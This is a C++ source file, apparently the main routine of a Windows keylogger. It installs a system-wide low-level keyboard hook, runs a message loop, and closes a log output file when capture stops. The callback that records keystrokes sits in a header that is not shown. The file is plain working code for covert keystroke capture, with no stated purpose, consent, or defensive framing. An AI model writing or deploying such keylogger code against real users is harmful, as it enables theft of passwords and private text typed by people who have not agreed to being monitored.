#include "../include/hook.h"
#include "../include/logger.h"

#include <iostream>
#include <windows.h>

int main ()
{
  HHOOK keyboardHook = SetWindowsHookEx (
      WH_KEYBOARD_LL,
      LowLevelKeyboardProc,
      NULL,
      0 );

  if ( keyboardHook == NULL )
  {
    std::cerr << "[ Failed to hook keyboard, exiting! ] \n";
    return 1;
  }

  MSG msg;

  while ( GetMessage ( &msg, NULL, 0, 0 ) )
  {
    TranslateMessage ( &msg );
    DispatchMessage ( &msg );
  }

  UnhookWindowsHookEx ( keyboardHook );

  Logger::outputFile.close ();
  std::cout << "[ Stopped capturing] \n";

  return 0;
}
